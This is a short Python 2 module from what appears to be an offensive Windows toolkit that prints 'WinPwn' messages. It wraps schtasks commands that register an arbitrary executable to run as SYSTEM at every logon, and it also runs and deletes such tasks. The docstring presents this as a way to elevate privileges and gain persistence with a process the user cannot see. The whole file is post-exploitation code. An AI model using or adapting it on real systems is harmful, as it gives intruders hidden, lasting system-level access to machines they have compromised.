"""
https://msdn.microsoft.com/en-us/library/windows/desktop/bb736357(v=vs.85).aspx
	
We use the built-in feature schtasks to elevate our process and gain
persistence on the system with the /SC ONLOGON switch.
	
/RU SYSTEM will run the process invisible since we're not SYSTEM. The process will
spawn and work as we want to, just that we can't see it.
"""
import os

def schtask(mode,executable_path,taskname):
	create_cmd = "schtasks /Create /TR {} /RU SYSTEM /TN {} /SC ONLOGON".format(executable_path,taskname)
	delete_cmd = "schtasks /Delete /TN {} /F".format(taskname)
	run_cmd = "schtasks /Run /TN {}".format(taskname)

	if (mode.lower() == "create"):
		try:
			print "[WinPwn] Schtask payload selected: ({})".format(create_cmd)
			schtasks_create = os.popen(create_cmd)
			if (schtasks_create.read() == ""):
				print "[WinPwn] Schtask results: ({})".format("Access Denied/Unknown error")
			else:
				print "[WinPwn] Schtask results: ({})".format(schtasks_create.read())
		except Exception as e:
			return False
	elif (mode.lower() == "run"):
		try:
			print "[WinPwn] Schtask run selected: ({})".format(run_cmd)
			schtasks_run = os.popen(run_cmd)
			if (schtasks_run.read() == ""):
				print "[WinPwn] Schtask results: ({})".format("Access Denied/Unknown error")
			else:
				print "[WinPwn] Schtask results: ({})".format(schtasks_run.read())
		except Exception as e:
			return False			
	elif (mode.lower() == "delete"):
		try:
			print "[WinPwn] Schtask payload selected: ({})".format(delete_cmd)
			schtasks_delete = os.popen(delete_cmd)
			if (schtasks_delete.read() == ""):
				print "[WinPwn] Schtask results: ({})".format("Access Denied/Unknown error")
			else:
				print "[WinPwn] Schtask results: ({})".format(schtasks_delete.read())			
		except Exception as e:
			return False	
